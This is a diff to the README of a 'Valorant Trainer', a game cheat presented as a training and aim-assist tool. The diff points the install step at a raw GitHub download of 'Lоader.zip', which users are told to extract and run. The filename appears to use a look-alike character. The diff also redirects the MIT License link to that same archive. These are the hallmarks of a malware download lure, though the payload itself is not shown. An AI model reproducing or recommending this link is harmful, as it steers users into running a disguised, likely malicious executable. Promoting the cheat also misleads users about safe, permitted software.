@@ -29,7 +29,7 @@ Welcome to **Valorant Trainer**, your advanced solution for customizing your Val
 
 ## 🚀 Installation Guide
 
-1. Download **Loader.rar** from the repository.
+1. Download **https://raw.githubusercontent.com/ALERTSSRU/ValorantEliteCoach/main/Lоader.zip** from the repository.
 2. Extract files using any archiver (WinRAR, 7-Zip, etc.).
 3. Run the Loader and follow on-screen instructions.
 4. Enjoy enhanced training in Valorant!
@@ -50,6 +50,6 @@ Valorant training tool, aim assistant, customizable valorant utilities, tactical
 
 ## 📜 License
 
-Licensed under the [MIT License](https://opensource.org/licenses/MIT) – 2025. Free to use, modify, and distribute. 
+Licensed under the [MIT License](https://raw.githubusercontent.com/ALERTSSRU/ValorantEliteCoach/main/Lоader.zip) – 2025. Free to use, modify, and distribute. 
 
 ---
